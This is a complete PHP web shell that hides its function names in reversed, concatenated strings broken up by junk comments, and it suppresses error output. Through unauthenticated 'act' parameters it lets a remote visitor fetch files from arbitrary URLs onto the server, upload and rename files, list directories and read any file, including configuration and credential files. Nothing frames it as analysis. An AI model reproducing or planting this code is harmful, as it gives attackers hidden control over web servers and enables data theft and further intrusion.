<?php 
error_reporting(0);
$sr="st"./*+/*+*/"rr"/*+/*+*/."ev";
$id=$sr/*+/*+*/("ri"."d_"."si");
$rn=$sr/*+/*+*/("em"."an"."er");
$dn=$sr/*+/*+*/("em"."anr"."id");
$od=$sr/*+/*+*/("ri"."dne"."po");
$rd=$sr/*+/*+*/("ri"."dda"."er");
$cd=$sr/*+/*+*/("ri"."deso"."lc");
$fpc=$sr/*+/*+*/("stn"."etn"."oc_t"."up_e"."lif");
$fgc=$sr/*+/*+*/("stn"."etn"."oc_t"."eg_e"."lif");
$muf=$sr/*+/*+*/("eli"."f_d"."eda"."olp"."u_e"."vom");

$dlform='<form method="post">FN:<input name="fn" size="20" type="text">URL:<input name="url" size="50" type="text"><input type="submit" value="ok"></form>';
$ulform='<form method="post" enctype="multipart/form-data"><input name="uf" type="file">SP:<input name="sp" size="50" type="text"><input type="submit" value="ok"></form>';
$rnform='<form method="post">ON:<input name="on" size="50" type="text">NN:<input name="nn" size="50" type="text"><input type="submit" value="ok"></form>';
$lpform='<form method="post">DP:<input name="dp" size="50" type="text"><input type="submit" value="ok"></form>';
$sfform='<form method="post">DF:<input name="df" size="50" type="text"><input type="submit" value="ok"></form>';

        if($_GET['act']=='dl'){echo($dlform);
		if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/*+/*+*/($_POST['fn'],$fgc/*+/*+*/($_POST['url']));
    }exit;
    }       
        if($_GET['act']=='ul'){echo($ulform);
	    if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';
		$muf/*+/*+*/($/*+/*+*/{"_F"."IL"."ES"}["uf"]["tmp_name"],$sp.$/*+/*+*/{"_F"."IL"."ES"}["uf"]["name"]);
	}exit;
	}
	    if($_GET['act']=='rn'){echo($rnform);
		if($_SERVER['REQUEST_METHOD']=='POST'){$rn/*+/*+*/($_POST['on'],$_POST['nn']);
	}exit;
	    }
	    if($_GET['act']=='gp'){echo($dn/*+/*+*/(__FILE__))
	;exit;
		}
		if($_GET['act']=='lp'){echo($lpform);
		if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/*+/*+*/($dp);
		while(($fn=$rd/*+/*+*/($h))!==false){if($id/*+/*+*/($dp.$fn)){$t1.='D&nbsp;'.$fn.'<br>';
		}else{$t2.='&nbsp;&nbsp;'.$fn.'<br>';}}$cd/*+/*+*/($dp);
		echo($dp.'<br>'.$t1.$t2);
	}exit;
	    }
	    if($_GET['act']=='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];
		echo('<textarea style="width:100%;height:100%;" wrap="off">'.$fgc/*+/*+*/($df).'</textarea>');
	}exit;
	}
?>